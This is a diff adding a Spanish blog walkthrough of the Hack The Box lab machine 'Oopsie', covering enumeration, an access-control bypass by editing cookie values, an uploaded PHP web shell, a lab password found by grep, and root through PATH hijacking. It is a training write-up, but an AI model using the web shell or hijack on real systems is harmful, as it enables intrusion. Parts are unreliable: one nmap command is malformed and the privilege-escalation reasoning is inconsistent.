@@ -1629,6 +1629,196 @@ Solo será cuestión de buscar la flag y habremos completado la máquina.
 <div id="imgs" style="text-align: center;">
   <img src="/assets/images/StartingPoint/oopsie/oopsie.webp" alt="under" oncontextmenu="return false;">
 </div>
+Encendemos la máquina y nos da la dirección IP 10.129.165.105, comenzando lanzando ping para saber si esta activa.
+
+```bash
+ping -c 5 10.129.165.105
+PING 10.129.165.105 (10.129.165.105) 56(84) bytes of data.
+64 bytes from 10.129.165.105: icmp_seq=1 ttl=63 time=111 ms
+64 bytes from 10.129.165.105: icmp_seq=2 ttl=63 time=107 ms
+64 bytes from 10.129.165.105: icmp_seq=3 ttl=63 time=108 ms
+64 bytes from 10.129.165.105: icmp_seq=4 ttl=63 time=108 ms
+64 bytes from 10.129.165.105: icmp_seq=5 ttl=63 time=107 ms
+
+--- 10.129.165.105 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 106.742/108.161/111.090/1.513 ms
+```
+
+Con un TTL 63, estamos frente a una máquina Linux.
+<h2 class="titulo-principal">Enumeración</h2>
+
+Usando nmap lanzamos un escaneo rápido y sigiloso:
+
+```bash
+nmap -p- --open -sS --min-rate -vvv -n -Pn 10.129.165.10.5 -oG allPorts
+```
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/namp.png" alt="under" oncontextmenu="return false;">
+</div>
+ 
+
+Usando **extractPorts** para limpiar el ruido de la captura de nmap vemos puerto 22 y 80 abiertos:
+<div  style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/extractPorts.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Lanzamos una serie de scripts básicos de reconocimiento con nmap para identificar la version y servicio:
+
+```bash
+nmap -sCV -p22,80 10.129.165.105 -oN targeted
+```
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/nmap2.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+<h2 class="titulo-principal">Explotación</h2>
+
+Seguimos enumerando el servicio web
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/whatweb.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Y encontramos un directorio '/uploads' usando la herramienta `gobuster`
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/dirbust.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Vamos a la página pero, no encontramos nada:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/web.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Vamos al directorio '/uploads' pero, no tenemos acceso:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/web1.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Al no encontrar directorios, y la máquina no esta haciendo **vhost**, hay otra manera de enumerar una página web y mediante **Proxies**.
+
+----
+<h3 class="titulo-secundario">¿Qué es Web Crawl?</h3>
+
+Un web crawl o rastreo de sitios web es el proceso de analizar el contenido de un sitio web. Esto se hace mediante un software automatizado llamado web crawler, araña web o bot.
+
+La herramienta **Burpsuite** permite hacer este mapeo recibiendo una petición.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/brup.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Al igual que **Caido**:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/webcrawl.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Y así encontramos el panel de login, pero no hay forma de burlar el panel de autenticación. Entonces le damos en 'Login as Guest'.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/web2.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Nos encontramos con un menu de usuario y registros y tenemos un id guardado en *Storage*, vemos un role=guest, y user=2233. Esto significa que ese es nuestro identificador en la paǵina:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+La página tiene una variable id=2, significa que podemos probar a cambiar su valor a 1:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc2.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Y nos lista el role=admin, y el id=34322
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc3.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Si cambiamos estos valores en la página y recargamos, seremos admin.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc4.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Siendo admin ya tenemos acceso a la ruta '/uploads', donde podemos probar subir un script en php.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc5.png" alt="under" oncontextmenu="return false;">
+</div>
+<br>
+<strong>Shell PHP</strong>:
+```php
+<?php
+system($_GET["cmd"]);
+?>
+```
+
+Subiendo el archivo y llendo a '/uploads/' usando la variable cmd vemos que tenemos ejecución remota de comandos.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/RCE.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Le subimos una reverse shell en php.
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/intrusion.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Ahora para salir del usuario 'www-data', haremos:
+
+```bash
+cat * | grep -i passw*
+```
+
+Y nos arroja la contraseña del usuario 'robert':
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/lat.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+```
+robert M3g4C0rpUs3r!
+```
+
+Nos logueamos como robert:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/intrusion2.png" alt="under" oncontextmenu="return false;">
+</div>
+
+
+Y ya tendremos la flag:
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/user.png" alt="under" oncontextmenu="return false;">
+</div>
+
+<h2 class="titulo-principal">Escalada</h2>
+
+Para la escalada con un `sudo -l` vemos que podemos ejecutar el binario `cat` como root. Dentro del sistema de archivo por lo general tenemos capacidad de escritura en `/dev/shm` y en `/tmp/`, entonces dentro de cualquiera de estos directorios creamos un archivo llamado **cat**, y lo abrimos con para ingresar:
+
+**cat**:
+```bash
+/bin/bash
+```
+
+Le damos permisos de ejecución con *chmod +x cat*, y hacemos un Path hijacking.
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+Logrando que se ejecuto primero nuestro binario malicioso *cat*. Y seremos root
+<div style="text-align: center;">
+  <img src="/assets/images/StartingPoint/oopsie/esc6.png" alt="under" oncontextmenu="return false;">
+</div>
 
 
 
